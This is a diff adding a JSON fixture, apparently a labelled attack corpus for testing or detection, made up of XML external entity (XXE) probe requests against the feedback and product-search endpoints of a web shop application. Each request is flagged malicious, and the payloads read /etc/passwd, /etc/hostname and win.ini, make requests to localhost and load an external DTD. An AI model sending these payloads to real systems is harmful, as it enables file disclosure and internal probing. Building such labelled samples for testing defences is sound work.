@@ -1,0 +1,95 @@
+{
+  "_comment": "XML external entity probes. Local range only.",
+  "dossier": {
+    "techniques": [
+      "other"
+    ],
+    "attack_class": "other",
+    "endpoints": [
+      "/api/Feedbacks/",
+      "/rest/products/search"
+    ]
+  },
+  "requests": [
+    {
+      "method": "POST",
+      "uri": "/api/Feedbacks/",
+      "body": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+      "content_type": "application/xml",
+      "malicious": true
+    },
+    {
+      "method": "POST",
+      "uri": "/api/Feedbacks/",
+      "body": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><comment>&xxe;</comment>",
+      "content_type": "text/xml",
+      "malicious": true
+    },
+    {
+      "method": "POST",
+      "uri": "/api/Feedbacks/",
+      "body": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1:3000/\">]><foo>&xxe;</foo>",
+      "content_type": "application/xml",
+      "malicious": true
+    },
+    {
+      "method": "POST",
+      "uri": "/api/Feedbacks/",
+      "body": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"http://127.0.0.1:3000/\">]><comment>&xxe;</comment>",
+      "content_type": "text/xml",
+      "malicious": true
+    },
+    {
+      "method": "POST",
+      "uri": "/api/Feedbacks/",
+      "body": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % p SYSTEM \"http://127.0.0.1:9/e.dtd\"> %p;]><foo>&xxe;</foo>",
+      "content_type": "application/xml",
+      "malicious": true
+    },
+    {
+      "method": "POST",
+      "uri": "/api/Feedbacks/",
+      "body": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % p SYSTEM \"http://127.0.0.1:9/e.dtd\"> %p;]><comment>&xxe;</comment>",
+      "content_type": "text/xml",
+      "malicious": true
+    },
+    {
+      "method": "POST",
+      "uri": "/api/Feedbacks/",
+      "body": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><foo>&xxe;</foo>",
+      "content_type": "application/xml",
+      "malicious": true
+    },
+    {
+      "method": "POST",
+      "uri": "/api/Feedbacks/",
+      "body": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><comment>&xxe;</comment>",
+      "content_type": "text/xml",
+      "malicious": true
+    },
+    {
+      "method": "GET",
+      "uri": "/rest/products/search?q=%3C%21DOCTYPE%20x%20%5B%3C%21ENTITY%20a%20%22b%22%3E%5D%3E",
+      "body": "",
+      "malicious": true
+    },
+    {
+      "method": "GET",
+      "uri": "/rest/products/search?q=%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C%21DOCTYPE%20z%20SYSTEM%20%22http%3A%2F%2F127.0.0.1%2Fx.dtd%22%3E",
+      "body": "",
+      "malicious": true
+    },
+    {
+      "method": "GET",
+      "uri": "/rest/products/search?q=%3C%21ENTITY%20lol%20%22lol%22%3E",
+      "body": "",
+      "malicious": true
+    },
+    {
+      "method": "GET",
+      "uri": "/rest/products/search?q=%3C%21DOCTYPE%20d%20%5B%3C%21ENTITY%20e%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fhostname%22%3E%5D%3E",
+      "body": "",
+      "malicious": true
+    }
+  ]
+}
